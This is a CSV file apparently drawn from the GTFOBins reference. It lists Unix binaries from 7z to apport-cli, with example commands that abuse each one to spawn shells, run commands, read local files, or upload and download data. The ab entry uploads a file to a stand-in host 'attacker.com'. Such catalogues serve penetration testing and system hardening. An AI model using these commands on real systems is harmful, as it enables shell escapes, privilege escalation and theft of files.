Binary Name,URL,Description,Functions,Examples
7z,https://gtfobins.org/gtfobins/7z/,This executable can read data from local files.,File read,7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so
aa-exec,https://gtfobins.org/gtfobins/aa-exec/,This executable can spawn an interactive system shell.,Shell,aa-exec /bin/sh
ab,https://gtfobins.org/gtfobins/ab/,This executable can download remote data.,Download; Upload,ab -v2 http://attacker.com/path/to/input-file; python -m http.server 80; ab -p /path/to/input-file http://attacker.com/
acr,https://gtfobins.org/gtfobins/acr/,This executable can run non-interactive system commands.,Command,"echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file"
agetty,https://gtfobins.org/gtfobins/agetty/,This executable can spawn an interactive system shell.,Shell,agetty -l /bin/sh -o -p -a root tty
alpine,https://gtfobins.org/gtfobins/alpine/,This executable can read data from local files.,File read,alpine -F /path/to/input-file
ansible-playbook,https://gtfobins.org/gtfobins/ansible-playbook/,This executable can spawn an interactive system shell.,Shell,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file
ansible-playbook /path/to/temp-file"
ansible-test,https://gtfobins.org/gtfobins/ansible-test/,This executable can spawn an interactive system shell.,Shell,ansible-test shell
aoss,https://gtfobins.org/gtfobins/aoss/,This executable can spawn an interactive system shell.,Shell,aoss /bin/sh
apache2,https://gtfobins.org/gtfobins/apache2/,This executable can read data from local files.,File read,apache2 -f /path/to/input-file; apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'
apache2ctl,https://gtfobins.org/gtfobins/apache2ctl/,This executable can read data from local files.,File read,apache2ctl -c 'Include /path/to/input-file'
apport-cli,https://gtfobins.org/gtfobins/apport-cli/,This executable can inherit functions from another.,Inherit,"apport-cli -f
1
2
v"
